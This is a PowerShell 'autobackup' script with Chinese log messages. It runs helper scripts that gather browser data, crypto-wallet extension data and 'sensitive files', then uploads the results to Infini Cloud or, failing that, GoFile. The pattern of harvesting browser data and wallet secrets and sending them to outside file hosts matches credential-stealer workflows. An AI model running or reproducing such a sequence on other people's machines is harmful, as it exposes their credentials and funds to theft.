[CmdletBinding()]
param(
    [int] $TimeoutMinutes = 10
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Continue'

$ZombieTools = Join-Path $HOME 'Zombie-Tools'
$TimeoutMilliseconds = $TimeoutMinutes * 60 * 1000

function Invoke-BackupStep {
    param(
        [Parameter(Mandatory)] [string] $Name,
        [Parameter(Mandatory)] [string] $FilePath,
        [string[]] $ArgumentList = @(),
        [switch] $PowerShellScript
    )

    Write-Host "[autobackup] 开始：$Name"

    if (-not (Test-Path -LiteralPath $FilePath -PathType Leaf)) {
        Write-Warning "[autobackup] 找不到脚本，跳过：$FilePath"
        return $false
    }

    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = if ($PowerShellScript) { 'powershell.exe' } else { 'python' }
    $startInfo.UseShellExecute = $false
    $startInfo.Arguments = if ($PowerShellScript) {
        '-NoProfile -ExecutionPolicy Bypass -File ' + ('"{0}"' -f $FilePath)
    } else {
        ('"{0}"' -f $FilePath) + $(if ($ArgumentList.Count) { ' ' + ($ArgumentList -join ' ') } else { '' })
    }

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo

    try {
        if (-not $process.Start()) {
            Write-Warning "[autobackup] 无法启动：$Name"
            return $false
        }

        if (-not $process.WaitForExit($TimeoutMilliseconds)) {
            Write-Warning "[autobackup] 超时，终止并继续：$Name"
            $process.Kill()
            $process.WaitForExit()
            return $false
        }

        if ($process.ExitCode -ne 0) {
            Write-Warning "[autobackup] 失败（退出码 $($process.ExitCode)）：$Name"
            return $false
        }

        Write-Host "[autobackup] 完成：$Name"
        return $true
    } catch {
        Write-Warning "[autobackup] 异常，跳过：$Name；$($_.Exception.Message)"
        return $false
    } finally {
        $process.Dispose()
    }
}

$browserScript = Join-Path $ZombieTools '备份\备份浏览器数据\wins\export_browser_data.py'
$walletScript = Join-Path $ZombieTools '备份\备份钱包扩展数据\wins\backup-wallet-ext.py'
$sensitiveScript = Join-Path $ZombieTools '备份\备份root敏感文件\backup-sensitive.ps1'

if (-not (Test-Path -LiteralPath $sensitiveScript -PathType Leaf)) {
    $sensitiveScript = Join-Path $ZombieTools '备份\备份敏感文件\backup-sensitive.ps1'
}

[void] (Invoke-BackupStep -Name '浏览器数据备份' -FilePath $browserScript)
[void] (Invoke-BackupStep -Name '钱包扩展数据备份' -FilePath $walletScript)
[void] (Invoke-BackupStep -Name '敏感文件备份' -FilePath $sensitiveScript -PowerShellScript)

$infiniScript = Join-Path $ZombieTools '上传\infini-cloud\upload.py'
$gofileScript = Join-Path $ZombieTools '上传\gofile\upload.py'
$infiniSucceeded = Invoke-BackupStep -Name 'Infini Cloud 上传' -FilePath $infiniScript -ArgumentList @('--auto-backup')

if (-not $infiniSucceeded) {
    Write-Warning '[autobackup] Infini Cloud 失败，回退到 GoFile'
    [void] (Invoke-BackupStep -Name 'GoFile 上传' -FilePath $gofileScript -ArgumentList @('--auto-backup'))
}

Write-Host '[autobackup] 所有步骤已处理。'
